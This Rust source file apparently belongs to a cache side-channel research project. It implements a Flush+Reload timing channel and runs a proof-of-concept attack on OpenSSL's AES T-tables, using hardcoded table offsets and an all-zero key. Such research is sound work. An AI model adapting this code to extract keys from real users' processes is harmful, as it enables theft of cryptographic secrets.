use aes_t_tables::{
    attack_t_tables_poc, AESTTableParams, CacheStatus, SideChannelError, SingleAddrCacheSideChannel,
};
use cache_utils::calibration::only_reload;
use cache_utils::{flush, rdtsc_fence};
use std::path::Path;

#[derive(Debug)]
struct NaiveFlushAndReload {
    pub threshold: u64,
    current: Option<*const u8>,
}

impl NaiveFlushAndReload {
    fn from_threshold(threshold: u64) -> Self {
        NaiveFlushAndReload {
            threshold,
            current: None,
        }
    }
}

impl SingleAddrCacheSideChannel for NaiveFlushAndReload {
    type ChannelFatalError = ();

    fn test(
        &mut self,
        addr: *const u8,
    ) -> Result<CacheStatus, SideChannelError<Self::ChannelFatalError>> {
        if self.current != Some(addr) {
            panic!(); // FIXME
        }
        let t = unsafe { only_reload(addr) };
        if t > self.threshold {
            Ok(CacheStatus::Miss)
        } else {
            Ok(CacheStatus::Hit)
        }
    }

    fn victim(&mut self, operation: &dyn Fn()) {
        operation()
    }

    fn calibrate(
        &mut self,
        _addresses: impl IntoIterator<Item = *const u8>,
    ) -> Result<(), Self::ChannelFatalError> {
        Ok(())
    }

    fn prepare(&mut self, addr: *const u8) {
        unsafe { flush(addr) };
        self.current = Some(addr);
    }
}

fn main() {
    let open_sslpath = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
    let mut side_channel = NaiveFlushAndReload::from_threshold(200);
    attack_t_tables_poc(
        &mut side_channel,
        AESTTableParams {
            num_encryptions: 10000,
            key: [0; 32],
            te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
            openssl_path: &open_sslpath,
        },
    );
}
